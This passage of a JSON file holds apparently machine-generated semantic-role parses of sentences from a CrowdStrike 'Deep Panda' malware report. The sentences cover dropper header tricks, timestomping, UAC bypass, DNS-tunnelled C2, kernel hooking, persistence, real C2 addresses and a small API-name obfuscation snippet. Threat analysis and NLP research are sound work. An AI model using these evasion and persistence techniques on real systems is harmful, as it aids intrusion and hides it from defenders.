( regex )"}}}, "\n\nAfter establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will\nstart sending and receiving compressed binary blobs via the channel of choice": {"establishing": {"V": {"text": "establishing", "index": 1}, "ARG1": {"text": "any of the aforementioned channels for arbitrary binary data exchange"}}, "will": {"V": {"text": "will", "index": 15}}, "start": {"ARGM-TMP": {"text": "After establishing any of the aforementioned channels for arbitrary binary data exchange"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "start", "index": 16}, "ARG1": {"text": "sending and receiving compressed binary blobs"}, "ARGM-MNR": {"text": "via the channel of choice"}}, "sending": {"ARG0": {"text": "the malware"}, "V": {"text": "sending", "index": 17}, "ARG1": {"text": "compressed binary blobs"}, "ARGM-MNR": {"text": "via the channel of choice"}}, "receiving": {"ARGM-TMP": {"text": "After establishing any of the aforementioned channels for arbitrary binary data exchange"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "receiving", "index": 19}, "ARG1": {"text": "compressed binary blobs"}, "ARGM-MNR": {"text": "via the channel of choice"}}, "compressed": {"V": {"text": "compressed", "index": 20}, "ARG1": {"text": "binary blobs"}}}, " The sample supports the ability to act as a generic proxy, this may be  \nintended to proxy C2 traffic for other infected machines in order to minimize the number of systems \ncommunicating to the C2, thus enhancing OPSEC": {"supports": {"ARG0": {"text": "The sample"}, "V": {"text": "supports", "index": 2}, "ARG1": {"text": "the ability to act as a generic proxy"}}, "act": {"V": {"text": "act", "index": 6}, "ARG1": {"text": "as a generic proxy"}}, "may": {"V": {"text": "may", "index": 13}}, "be": {"V": {"text": "be", "index": 14}}, "intended": {"ARG2": {"text": "this"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "intended", "index": 15}, "ARG1": {"text": "to proxy C2 traffic for other infected machines"}, "ARGM-PRP": {"text": "in"}}, "proxy": {"ARG0": {"text": "this"}, "V": {"text": "proxy", "index": 17}, "ARG1": {"text": "C2 traffic"}, "ARGM-PRP": {"text": "for other infected machines/ in order to minimize the number of systems communicating to the C2 , thus enhancing OPSEC"}}, "minimize": {"V": {"text": "minimize", "index": 27}, "ARG1": {"text": "the number of systems communicating"}, "ARG2": {"text": "to the C2"}, "ARGM-ADV": {"text": "thus enhancing OPSEC"}}, "communicating": {"ARG1": {"text": "systems"}, "V": {"text": "communicating", "index": 32}}, "enhancing": {"ARGM-DIS": {"text": "thus"}, "V": {"text": "enhancing", "index": 38}, "ARG1": {"text": "OPSEC"}}}, " This command then modifies the creation, modification, and last \naccess timestamps of the modified file to conceal the content modifications": {"modifies": {"ARG0": {"text": "This command"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "modifies", "index": 3}, "ARG1": {"text": "the creation , modification , and last access timestamps of the modified file to conceal the content modifications"}}, "modified": {"V": {"text": "modified", "index": 15}, "ARG1": {"text": "file"}}, "conceal": {"V": {"text": "conceal", "index": 18}, "ARG1": {"text": "the content modifications"}}}, " When the dropper writes the file to disk, the first byte of the file is 'Z' \nwhich prevents the file from executing or being detected as an executable by many defensive tools": {"writes": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "the dropper"}, "V": {"text": "writes", "index": 3}, "ARG1": {"text": "the file to disk"}}, "is": {"ARGM-TMP": {"text": "When the dropper writes the file to disk"}, "ARG1": {"text": "the first byte of the file"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "' Z ' which prevents the file from executing or being detected as an executable by many defensive tools"}}, "prevents": {"ARG0": {"text": "the/ ' Z '"}, "R-ARG0": {"text": "which"}, "V": {"text": "prevents", "index": 20}, "ARG1": {"text": "the file"}, "ARG2": {"text": "from executing"}}, "executing": {"ARG1": {"text": "the file"}, "V": {"text": "executing", "index": 24}}, "being": {"V": {"text": "being", "index": 26}}, "detected": {"V": {"text": "detected", "index": 27}, "ARGM-PRD": {"text": "as an executable"}, "ARG2": {"text": "by many defensive tools"}}}, " The hooking is performed by creating a new completion routine\nassociated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target\nprocess, performing several memory copies to hide the entry, and detaching": {"is": {"V": {"text": "is", "index": 2}}, "performed": {"ARG1": {"text": "The hooking"}, "V": {"text": "performed", "index": 3}, "ARGM-MNR": {"text": "by creating a new completion routine associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL , attaching to the target process , performing several memory copies to hide the entry , and detaching"}}, "creating": {"V": {"text": "creating", "index": 5}, "ARG1": {"text": "a new completion routine associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL"}}, "associated": {"ARG1": {"text": "a new completion routine"}, "V": {"text": "associated", "index": 10}, "ARG2": {"text": "with any IRP_MJ_DEVICE_CONTROL"}}, "matches": {"ARG0": {"text": "IRP"}, "R-ARG0": {"text": "that"}, "V": {"text": "matches", "index": 16}, "ARG1": {"text": "the IOCTL"}}, "attaching": {"V": {"text": "attaching", "index": 20}, "ARG2": {"text": "to the target process"}}, "performing": {"V": {"text": "performing", "index": 26}, "ARG1": {"text": "several memory copies"}, "ARGM-PRP": {"text": "to hide the entry"}}, "hide": {"V": {"text": "hide", "index": 31}, "ARG1": {"text": "the entry"}}}, " The imported function names are not encrypted; however, the\nfunction name is minutely obfuscated by a simple single character substitution:\n\n<code>\n   //Obfuscation of GetTempPathA() API function call\n   strcpy((char *)ProcName, \u201c2etTempPathA\u201d);\n   ProcName[0] = \u2018G\u2019;\n</code>\n\nThe dropper invokes the SHGetSpecialFolderPath() API supplying a Constant Special Item ID List (CSIDL)\nof \u2018CSIDL_COMMON_DOCUMENTS\u2019 to identify the destination folder for the malicious DLL payload": {"imported": {"V": {"text": "imported", "index": 1}, "ARG1": {"text": "function names"}}, "are": {"ARG1": {"text": "The imported function names"}, "V": {"text": "are", "index": 4}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "The imported function names"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "encrypted", "index": 6}}, "is": {"ARGM-DIS": {"text": "however"}, "ARG1": {"text": "the function name"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "minutely obfuscated by a simple single character substitution"}}, "obfuscated": {"ARGM-DIS": {"text": "however"}, "ARG1": {"text": "the function name"}, "ARGM-ADV": {"text": "minutely"}, "V": {"text": "obfuscated", "index": 15}, "ARG0": {"text": "by a simple single character substitution"}}, "invokes": {"ARG0": {"text": "The dropper"}, "V": {"text": "invokes", "index": 25}, "ARG1": {"text": "the SHGetSpecialFolderPath ( ) API supplying"}}, "supplying": {"ARG0": {"text": "The dropper invokes the SHGetSpecialFolderPath ( ) API"}, "V": {"text": "supplying", "index": 31}, "ARG1": {"text": "a Constant Special Item ID List ( CSIDL ) of \u2018 CSIDL_COMMON_DOCUMENTS \u2019 to identify the destination folder for the malicious DLL payload"}}, "identify": {"V": {"text": "identify", "index": 46}, "ARG1": {"text": "the destination folder for the malicious DLL payload"}}}, "\n\nAdditionally, the malware contains a custom DNS client implementation that will use the system's configured DNS server to tunnel C2 traffic over legitimate DNS": {"contains": {"ARGM-DIS": {"text": "Additionally"}, "ARG0": {"text": "the malware"}, "V": {"text": "contains", "index": 4}, "ARG1": {"text": "a custom DNS client implementation that will use the system 's configured DNS server to tunnel C2 traffic over legitimate DNS"}}, "will": {"ARG0": {"text": "a custom DNS client implementation"}, "R-ARG0": {"text": "that"}, "V": {"text": "will", "index": 11}, "ARG1": {"text": "use the system 's configured DNS server to tunnel C2 traffic"}}, "use": {"ARG0": {"text": "a custom DNS client implementation"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "use", "index": 12}, "ARG1": {"text": "the system 's configured DNS server"}, "ARG2": {"text": "to tunnel C2 traffic over legitimate DNS"}}, "tunnel": {"ARG0": {"text": "that"}, "V": {"text": "tunnel", "index": 20}, "ARG1": {"text": "C2 traffic over legitimate DNS"}}}, " It also is able to bypass User Account Control (UAC) to install\nitself by using the \u2018sysprep.exe\u2019 Microsoft Windows executable provided by the targeted system": {"is": {"ARG1": {"text": "It"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "able to bypass User Account Control ( UAC ) to install itself by using the \u2018 sysprep.exe \u2019 Microsoft Windows executable provided by the targeted system"}}, "bypass": {"ARG0": {"text": "It"}, "V": {"text": "bypass", "index": 5}, "ARG1": {"text": "User Account Control ( UAC ) to install itself by using the \u2018 sysprep.exe \u2019 Microsoft Windows executable provided by the targeted system"}}, "install": {"V": {"text": "install", "index": 13}, "ARG1": {"text": "itself"}, "ARGM-MNR": {"text": "by using the \u2018 sysprep.exe \u2019 Microsoft Windows executable provided by the targeted system"}}, "using": {"V": {"text": "using", "index": 16}, "ARG1": {"text": "the \u2018 sysprep.exe \u2019 Microsoft Windows executable provided by the targeted system"}}, "executable": {"ARG0": {"text": "Microsoft Windows"}, "V": {"text": "executable", "index": 23}, "ARG1": {"text": "provided by the"}}, "provided": {"ARG1": {"text": "the \u2018 sysprep.exe \u2019"}, "V": {"text": "provided", "index": 24}, "ARG0": {"text": "by the targeted system"}}, "targeted": {"V": {"text": "targeted", "index": 27}, "ARG1": {"text": "system"}}}, "\n</section>\n\n<footer>\nCROWDSTRIKE                                                                       S E N S I T I VE            4\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)</heading>\nThis sample is a 'backdoor' which is the DLL dropped by the dropper sample file with an MD5 of \n14c04f88dc97aef3e9b516ef208a2bf5": {"is": {"ARG1": {"text": "This sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a ' backdoor ' which is the DLL dropped by the dropper sample file with an MD5 of 14c04f88dc97aef3e9b516ef208a2bf5"}}, "is_2": {"ARG1": {"text": "a ' backdoor '"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "the DLL dropped by the dropper sample file with an MD5 of 14c04f88dc97aef3e9b516ef208a2bf5"}}, "dropped": {"ARG1": {"text": "the DLL"}, "V": {"text": "dropped", "index": 11}, "ARG0": {"text": "by the dropper sample file"}, "ARG4": {"text": "with an MD5 of 14c04f88dc97aef3e9b516ef208a2bf5"}}}, " A typical path is C:\\Documents and Settings\\All Users\\Documents.\u201d\n\n\nThe dropper attempts to write the malicious payload to one of the following names, using the first \navailable name in this set:\n<list>\n       1": {"is": {"ARG1": {"text": "A typical path"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "C:\\Documents"}}, "attempts": {"ARG0": {"text": "The dropper"}, "V": {"text": "attempts", "index": 12}, "ARG1": {"text": "to write the malicious payload to one of the following names , using the first available name in this set"}}, "write": {"ARG0": {"text": "The dropper"}, "V": {"text": "write", "index": 14}, "ARG1": {"text": "the malicious payload"}, "ARG2": {"text": "to one of the following names"}, "ARGM-MNR": {"text": "using the first available name in this set"}}, "following": {"V": {"text": "following", "index": 22}, "ARG1": {"text": "names"}}, "using": {"V": {"text": "using", "index": 25}, "ARG1": {"text": "the first available name in this set"}}}, " Adds itself to list of services started by \u2018netsvc\u2019 using the service name \u2018helpsvc\u2019": {"Adds": {"V": {"text": "Adds", "index": 0}, "ARG1": {"text": "itself"}, "ARG2": {"text": "to list of services started by \u2018 netsvc \u2019 using the service name \u2018 helpsvc \u2019"}}, "started": {"ARG1": {"text": "list of services"}, "V": {"text": "started", "index": 6}, "ARG0": {"text": "by \u2018 netsvc \u2019"}, "ARGM-MNR": {"text": "using the service name \u2018 helpsvc"}}, "using": {"V": {"text": "using", "index": 11}, "ARG1": {"text": "the service name \u2018 helpsvc \u2019"}}}, "\n\n While the various network hooking techniques used in the kernel driver may appear novel or well\n researched, upon close inspection it is actually a line-for-line copy of an existing post from the now-offline\n \u2018rootkit.com\u2019 by a Chinese language developer": {"used": {"ARG1": {"text": "the various network hooking techniques"}, "V": {"text": "used", "index": 6}, "ARGM-LOC": {"text": "in the kernel driver"}}, "may": {"V": {"text": "may", "index": 11}}, "appear": {"ARGM-MOD": {"text": "may"}, "V": {"text": "appear", "index": 12}, "ARG1": {"text": "novel"}}, "researched": {"ARG1": {"text": "the various network hooking techniques used in the kernel driver"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "researched", "index": 16}}, "is": {"ARGM-ADV": {"text": "While the various network hooking techniques used in the kernel driver may appear novel or well researched/ actually"}, "ARGM-TMP": {"text": "upon close inspection"}, "ARG1": {"text": "it"}, "V": {"text": "is", "index": 22}, "ARG2": {"text": "a line - for - line copy of an existing post from the now - offline \u2018 rootkit.com \u2019 by a Chinese language developer"}}, "existing": {"V": {"text": "existing", "index": 33}, "ARG1": {"text": "post"}}}, " \nAdditionally, this class implements launching of specified executable files via the CreateProcess() API": {"launching": {"ARGM-DIS": {"text": "Additionally"}, "ARG0": {"text": "this class implements"}, "V": {"text": "launching", "index": 5}, "ARG1": {"text": "of specified executable files"}, "ARGM-MNR": {"text": "via the CreateProcess ( ) API"}}, "specified": {"V": {"text": "specified", "index": 7}, "ARG1": {"text": "executable files"}}}, " This export then implements the actual install logic to maintain persistence and invoke the main\nroutine": {"implements": {"ARG0": {"text": "This export"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "implements", "index": 3}, "ARG1": {"text": "the actual install logic to maintain persistence and invoke the main routine"}}, "maintain": {"V": {"text": "maintain", "index": 9}, "ARG1": {"text": "persistence"}}, "invoke": {"V": {"text": "invoke", "index": 12}, "ARG1": {"text": "the main routine"}}}, "\nThe dropper subsequently opens the dropped file and corrects the header by writing the 'M' over the first \nbyte, allowing the file to be executed": {"opens": {"ARG0": {"text": "The dropper"}, "ARGM-TMP": {"text": "subsequently"}, "V": {"text": "opens", "index": 3}, "ARG1": {"text": "the dropped file"}, "ARG2": {"text": "by writing the ' M ' over the first byte"}, "ARGM-ADV": {"text": "allowing the file to be executed"}}, "dropped": {"V": {"text": "dropped", "index": 5}, "ARG1": {"text": "file"}}, "corrects": {"ARG0": {"text": "The dropper"}, "ARGM-TMP": {"text": "subsequently"}, "V": {"text": "corrects", "index": 8}, "ARG1": {"text": "the header"}, "ARGM-MNR": {"text": "by writing the ' M ' over the first byte , allowing the file to be executed"}}, "writing": {"ARG0": {"text": "The dropper"}, "V": {"text": "writing", "index": 12}, "ARG1": {"text": "the ' M '"}, "ARGM-MNR": {"text": "over the first byte"}, "ARGM-ADV": {"text": "allowing the file to be executed"}}, "allowing": {"V": {"text": "allowing", "index": 22}, "ARG1": {"text": "the file to be executed"}}, "be": {"V": {"text": "be", "index": 26}}, "executed": {"ARG1": {"text": "the file"}, "V": {"text": "executed", "index": 27}}}, "\n\n\nThe system call hook is then performed by first allocating a Memory Descriptor List (MDL) using the    \nWindows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using\nMmBuildMdlForNonPagedPool()": {"is": {"V": {"text": "is", "index": 4}}, "performed": {"ARG1": {"text": "The system call hook"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "performed", "index": 6}, "ARG0": {"text": "by first allocating a Memory Descriptor List ( MDL )"}, "ARGM-MNR": {"text": "using the Windows API IoAllocateMdl ( )"}}, "allocating": {"ARGM-TMP": {"text": "first"}, "V": {"text": "allocating", "index": 9}, "ARG1": {"text": "a Memory Descriptor List ( MDL )"}, "ARGM-MNR": {"text": "using the Windows API IoAllocateMdl ( )"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "the Windows API IoAllocateMdl ( )"}}, "associating": {"ARG1": {"text": "The system call hook/ the MDL"}, "V": {"text": "associating", "index": 26}, "ARG2": {"text": "to a non - paged buffer"}, "ARGM-ADV": {"text": "using MmBuildMdlForNonPagedPool ( )"}}, "paged": {"ARGM-MNR": {"text": "non"}, "V": {"text": "paged", "index": 33}}, "using_2": {"V": {"text": "using", "index": 35}, "ARG1": {"text": "MmBuildMdlForNonPagedPool ( )"}}}, " Thus the sample will only attempt to connect directly using \na raw socket to the C2 located at 1.9.5.38:443": {"will": {"ARGM-DIS": {"text": "Thus"}, "V": {"text": "will", "index": 3}}, "attempt": {"ARGM-DIS": {"text": "Thus"}, "ARG0": {"text": "the sample"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "attempt", "index": 5}, "ARG1": {"text": "to connect directly using a raw socket to the C2 located at 1.9.5.38:443"}}, "connect": {"ARG0": {"text": "the sample"}, "V": {"text": "connect", "index": 7}, "ARGM-MNR": {"text": "directly"}, "ARG1": {"text": "using a raw socket to the C2 located at 1.9.5.38:443"}}, "using": {"ARGM-MNR": {"text": "directly"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "a raw socket"}, "ARG2": {"text": "to the C2 located at 1.9.5.38:443"}}, "located": {"ARG1": {"text": "the C2"}, "V": {"text": "located", "index": 16}, "ARGM-LOC": {"text": "at 1.9.5.38:443"}}}, " The driv-                                                                                                              \ner is encrypted with a simple four byte XOR key value of 0x2E885Df3; after decryption the file has the MD5\nhash of dae6b9b3b8e39b08b10a51a6457444d8": {"is": {"ARG1": {"text": "The driv-"}, "ARGM-DIS": {"text": "er"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "encrypted with a simple four byte XOR key value of 0x2E885Df3"}}, "encrypted": {"ARG1": {"text": "The driv-"}, "ARGM-DIS": {"text": "er"}, "V": {"text": "encrypted", "index": 4}, "ARGM-MNR": {"text": "with a simple four byte XOR key value of 0x2E885Df3"}}, "has": {"ARGM-TMP": {"text": "after decryption"}, "ARG0": {"text": "the file"}, "V": {"text": "has", "index": 20}, "ARG1": {"text": "the MD5 hash of dae6b9b3b8e39b08b10a51a6457444d8"}}}, " \n</section>\n\n<section>\n<heading>Backdoor Functionality, Supported Commands</heading>\nThe primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote\nDesktop over a custom protocol": {"is": {"ARG1": {"text": "The primary aim of this backdoor"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "remote desktop control functionality comparable to VNC or Remote Desktop over a custom protocol"}}}, " The con-\nfiguration contains the C2 protocol to be used or optionally a self-configuration mode in which the malware \nattempts the different C2 protocols in a pre-defined order": {"contains": {"ARG0": {"text": "The con- figuration"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "the C2 protocol to be used or optionally a self - configuration mode in which the malware attempts the different C2 protocols in a pre - defined order"}}, "be": {"V": {"text": "be", "index": 8}}, "used": {"ARG1": {"text": "the C2 protocol"}, "V": {"text": "used", "index": 9}}, "attempts": {"ARGM-LOC": {"text": "a self - configuration mode"}, "R-ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "the malware"}, "V": {"text": "attempts", "index": 21}, "ARG1": {"text": "the different C2 protocols in a pre - defined order"}}}, " In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an\nattacker to have full control of the system": {"is": {"ARGM-LOC": {"text": "In this case"}, "ARG1": {"text": "the malicious payload"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "a Dynamic - Link Library ( DLL ) , which enables an attacker to have full control of the system"}}, "enables": {"ARG0": {"text": "a Dynamic - Link Library ( DLL )"}, "R-ARG0": {"text": "which"}, "V": {"text": "enables", "index": 18}, "ARG1": {"text": "an attacker to have full control of the system"}}, "have": {"ARG0": {"text": "an attacker"}, "V": {"text": "have", "index": 22}, "ARG1": {"text": "full control of the system"}}}, " The version of the malicious sample, in this case it is 841\n</list>\n<figure></figure>\n\n\nAn example authentication packet sent to the C2 is located in Appendix E": {"is": {"ARGM-ADV": {"text": "in this case"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "841"}, "ARG1": {"text": "An example authentication packet sent to the C2 is located in Appendix E"}}, "sent": {"ARG1": {"text": "An example authentication packet"}, "V": {"text": "sent", "index": 17}, "ARG2": {"text": "to the C2"}}, "is_2": {"V": {"text": "is", "index": 21}}, "located": {"ARG1": {"text": "The version/ An example authentication packet sent to the C2"}, "V": {"text": "located", "index": 22}, "ARGM-LOC": {"text": "in Appendix E"}}}, " The user-mode service stores configuration data in the \"Security\" subkey of the RPC registry key, \nthis component will obfuscate the user-mode configuration data": {"will": {"ARG0": {"text": "this component"}, "V": {"text": "will", "index": 22}, "ARG2": {"text": "obfuscate the user - mode configuration data"}}, "obfuscate": {"ARG0": {"text": "this component"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "obfuscate", "index": 23}, "ARG1": {"text": "the user - mode configuration data"}}}, "\n</section>\n\n<section>\n<heading>Post Exploitation Tool</heading>\nThe post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be\ndropped and executed by a client-side exploit, or the adversary can launch it using a variety of command\nline options": {"is": {"ARG1": {"text": "2dce7fc3f52a692d8a84a0c182519133 )"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "a dual - use tool"}}, "can": {"V": {"text": "can", "index": 17}}, "be": {"V": {"text": "be", "index": 18}}, "dropped": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "dropped", "index": 19}, "ARG0": {"text": "by a client - side exploit"}}, "executed": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "executed", "index": 21}, "ARG0": {"text": "by a client - side exploit"}}, "can_2": {"V": {"text": "can", "index": 32}}, "launch": {"ARG0": {"text": "the adversary"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "launch", "index": 33}, "ARG1": {"text": "it"}, "ARGM-MNR": {"text": "using a variety of command line options"}}, "using": {"V": {"text": "using", "index": 35}, "ARG1": {"text": "a variety of command line options"}}}, " After attempting to disable the existing service, the malware tries to install itself as\na service with that same name": {"attempting": {"V": {"text": "attempting", "index": 1}, "ARG1": {"text": "to disable the existing service"}, "ARG0": {"text": "the malware"}}, "disable": {"V": {"text": "disable", "index": 3}, "ARG1": {"text": "the existing service"}, "ARG0": {"text": "the malware"}}, "existing": {"V": {"text": "existing", "index": 5}, "ARG1": {"text": "service"}}, "tries": {"ARGM-TMP": {"text": "After attempting to disable the existing service"}, "ARG0": {"text": "the malware"}, "V": {"text": "tries", "index": 10}, "ARG1": {"text": "to install itself as a service with that same name"}}, "install": {"ARG0": {"text": "the malware"}, "V": {"text": "install", "index": 12}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a service with that same name"}}}, " It would appear this technique is meant to obfuscate the activities of the\nmalicious sample by masking the process creator\u2019s user name to appear to be a generic domain user": {"would": {"V": {"text": "would", "index": 1}}, "appear": {"ARGM-MOD": {"text": "would"}, "V": {"text": "appear", "index": 2}, "ARG1": {"text": "this technique is meant to obfuscate the activities of the malicious sample by masking the process creator \u2019s user name to appear to be a generic domain user"}}, "is": {"V": {"text": "is", "index": 5}}, "meant": {"ARG1": {"text": "this technique"}, "V": {"text": "meant", "index": 6}, "C-ARG1": {"text": "to obfuscate the activities of the malicious sample by masking the process creator \u2019s user name to appear to be a generic domain user"}}, "obfuscate": {"ARG0": {"text": "this technique"}, "V": {"text": "obfuscate", "index": 8}, "ARG1": {"text": "the activities of the malicious sample"}, "ARGM-MNR": {"text": "by masking the process creator \u2019s user name to appear to be a generic domain user"}}, "masking": {"ARG0": {"text": "this technique"}, "V": {"text": "masking", "index": 16}, "ARG1": {"text": "the process creator \u2019s user name"}, "ARGM-PRP": {"text": "to appear to be a generic domain user"}}, "appear_2": {"V": {"text": "appear", "index": 24}, "ARG1": {"text": "to be a generic domain user"}}, "be": {"ARG1": {"text": "creator \u2019s user name"}, "V": {"text": "be", "index": 26}, "ARG2": {"text": "a generic domain user"}}}, "\n</section>\n\n<section>\n<heading>PCC_MISC : Gather and report system information</heading>\nThe malware is capable of gathering various pieces of information from the system, triggered by a command\nID 10": {"is": {"ARG1": {"text": "The malware"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "capable of gathering various pieces of information from the system , triggered by a command ID 10"}}, "gathering": {"ARG0": {"text": "The malware"}, "V": {"text": "gathering", "index": 5}, "ARG1": {"text": "various pieces of information"}, "ARG2": {"text": "from the system"}}, "triggered": {"ARG1": {"text": "The malware"}, "V": {"text": "triggered", "index": 14}, "ARG0": {"text": "by a command ID 10"}}}, " The ldasm inline hooking is also repeated in numerous postings\n to Chinese forums": {"inline": {"ARG0": {"text": "ldasm"}, "V": {"text": "inline", "index": 2}, "ARG1": {"text": "hooking"}}, "is": {"V": {"text": "is", "index": 4}}, "repeated": {"ARG1": {"text": "The ldasm inline hooking"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "repeated", "index": 6}, "ARGM-MNR": {"text": "in numerous postings"}}}, "\n       \udbc0\udd94 The currently logged in username in the system as obtained with the GetUserName() API \n       \udbc0\udd94 The machine's uptime\n       \udbc0\udd94 The Windows Version and Service Pack level\n       \udbc0\udd94 The amount of available Physical Memory in MB\n       \udbc0\udd94 Current Remote Desktop sessions as enumerated with WTSEnumerateSessions\n       \udbc0\udd94 A string identifier statically set to \"FBI20111024\"\n</list>\nThe beacon is encrypted using an XOR/ADD loop using the statically defined key 0x1C and sent to the C2": {"logged": {"ARG1": {"text": "The"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "logged", "index": 3}, "ARGM-LOC": {"text": "in username in the system"}, "ARGM-ADV": {"text": "as obtained with the GetUserName ( ) API"}}, "obtained": {"V": {"text": "obtained", "index": 10}, "ARGM-MNR": {"text": "with the GetUserName ( ) API"}}, "enumerated": {"V": {"text": "enumerated", "index": 45}, "ARGM-MNR": {"text": "with"}, "ARG2": {"text": "WTSEnumerateSessions"}}, "set": {"ARG1": {"text": "A string identifier"}, "ARGM-MNR": {"text": "statically"}, "V": {"text": "set", "index": 53}, "ARG2": {"text": "to \" FBI20111024 \" The beacon"}}, "is": {"V": {"text": "is", "index": 60}}, "encrypted": {"ARG1": {"text": "The beacon"}, "V": {"text": "encrypted", "index": 61}, "ARGM-MNR": {"text": "using an XOR"}}, "using": {"V": {"text": "using", "index": 62}, "ARG1": {"text": "an XOR / ADD loop"}, "ARGM-MNR": {"text": "using the statically defined key 0x1C"}}, "using_2": {"V": {"text": "using", "index": 68}, "ARG1": {"text": "the statically defined key 0x1C"}}, "defined": {"ARG2": {"text": "the"}, "ARGM-MNR": {"text": "statically"}, "V": {"text": "defined", "index": 71}, "ARG1": {"text": "key 0x1C"}}, "sent": {"V": {"text": "sent", "index": 75}, "ARG2": {"text": "to the C2"}}}, "\n\n<figure></figure>\n</section>\n\n<section>\n<heading>Network Protocol and Implementation</heading>\nThere are three components to the protocol:\n\nAuthentication is accomplished using a 32 byte packet, this packet consists of:\n\n<list>\n       1": {}, "\n\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default\nconfiguration present specifies 202.86.190.3:80 as a C2 to use, this is the same Hong Kong C2 server as \nthe one used by the post exploitation .NET tool": {"is": {"V": {"text": "is", "index": 2}, "ARG1": {"text": "code in the binary that allows downloading a list of C2 servers from an HTTP URL , the default configuration present specifies 202.86.190.3:80 as a C2 to use"}}, "allows": {"ARG0": {"text": "the binary"}, "R-ARG0": {"text": "that"}, "V": {"text": "allows", "index": 8}, "ARG1": {"text": "downloading a list of C2 servers from an HTTP URL"}}, "downloading": {"ARG0": {"text": "that"}, "V": {"text": "downloading", "index": 9}, "ARG1": {"text": "a list of C2 servers"}, "ARG2": {"text": "from an HTTP URL"}}, "use": {"ARG1": {"text": "a C2"}, "V": {"text": "use", "index": 30}}, "is_2": {"ARGM-ADV": {"text": "While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL , the default configuration present specifies 202.86.190.3:80 as a C2 to use"}, "ARG1": {"text": "this"}, "V": {"text": "is", "index": 33}, "ARG2": {"text": "the same Hong Kong C2 server as the one used by the post exploitation"}}, "used": {"ARG1": {"text": "the one"}, "V": {"text": "used", "index": 43}, "ARG0": {"text": "by the post exploitation"}}}, "\n</section>\n\n<section>\n<heading>PCC_SYS: System Management</heading>\nThis handler class provides the attacker with the ability to manage system components including start/stop/\ndelete system services, enumerate/alter registry keys, and manage running processes": {"provides": {"ARG0": {"text": "This handler class"}, "V": {"text": "provides", "index": 3}, "ARG2": {"text": "the attacker"}, "ARG1": {"text": "with the ability to manage system components including start / stop/ delete system services , enumerate / alter registry keys , and manage running processes"}}, "manage": {"V": {"text": "manage", "index": 10}, "ARG1": {"text": "system components including start / stop/ delete system services"}}, "including": {"ARG2": {"text": "manage system components"}, "V": {"text": "including", "index": 13}, "ARG1": {"text": "start / stop/ delete system services , enumerate / alter registry keys"}}, "manage_2": {"V": {"text": "manage", "index": 28}, "ARG1": {"text": "running processes"}}}, "\n\nThe final step the dropper performs is to load the dropped DLL into its own process space; it then resolves \nthe export 'OpenINFOPerformanceData' from the DLL and invokes it with the dropped DLL's filename as \nparameter": {"performs": {"ARGM-ADJ": {"text": "dropper"}, "V": {"text": "performs", "index": 5}}, "is": {"ARG1": {"text": "The final step the dropper performs"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to load the dropped DLL into its own process space"}}, "load": {"V": {"text": "load", "index": 8}, "ARG2": {"text": "the dropped DLL"}, "ARG1": {"text": "into its own process space"}}, "dropped": {"V": {"text": "dropped", "index": 10}, "ARG1": {"text": "DLL"}}, "resolves": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "resolves", "index": 20}, "ARG1": {"text": "the export ' OpenINFOPerformanceData '"}, "ARG2": {"text": "from the DLL"}}, "OpenINFOPerformanceData": {"ARG0": {"text": "the export '"}, "V": {"text": "OpenINFOPerformanceData", "index": 24}, "ARGM-DIR": {"text": "from the DLL"}}, "invokes": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "invokes", "index": 30}, "ARG1": {"text": "it"}, "ARG2": {"text": "with the dropped DLL 's filename as parameter"}}, "dropped_2": {"V": {"text": "dropped", "index": 34}, "ARG1": {"text": "DLL 's 